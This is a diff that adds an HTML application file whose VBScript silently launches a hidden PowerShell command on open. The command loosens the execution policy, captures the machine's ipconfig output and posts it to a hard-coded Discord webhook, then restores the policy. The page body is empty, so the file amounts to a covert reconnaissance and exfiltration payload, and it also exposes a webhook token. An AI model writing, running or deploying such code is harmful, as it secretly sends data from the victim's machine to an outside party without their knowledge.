@@ -1,0 +1,27 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Run ipconfig and Send Result to Discord</title>
+    <script language="VBScript">
+        Dim objShell
+        Set objShell = CreateObject("WScript.Shell")
+
+        
+        Dim psCommand
+        psCommand = "powershell -NoProfile -Command ""$originalPolicy = Get-ExecutionPolicy; " & _
+                    "Set-ExecutionPolicy -Scope Process -ExecutionPolicy RemoteSigned -Force; " & _
+                    "$output = ipconfig; " & _
+                    "$webhookUrl = 'https://discord.com/api/webhooks/1275219530972532808/I01GybEVfNeVbYRJrSmXZ5i-K-8S03cggFNHIRsKxk82u4L-GfEMpIP3N8wGTuXEm3BQ'; " & _
+                    "$payload = @{content = $output} | ConvertTo-Json; " & _
+                    "Invoke-RestMethod -Uri $webhookUrl -Method Post -ContentType 'application/json' -Body $payload; " & _
+                    "Set-ExecutionPolicy -Scope Process -ExecutionPolicy $originalPolicy -Force"""""
+        
+        
+        objShell.Run psCommand, 0, True
+
+        Set objShell = Nothing
+    </script>
+</head>
+<body>
+</body>
+</html>
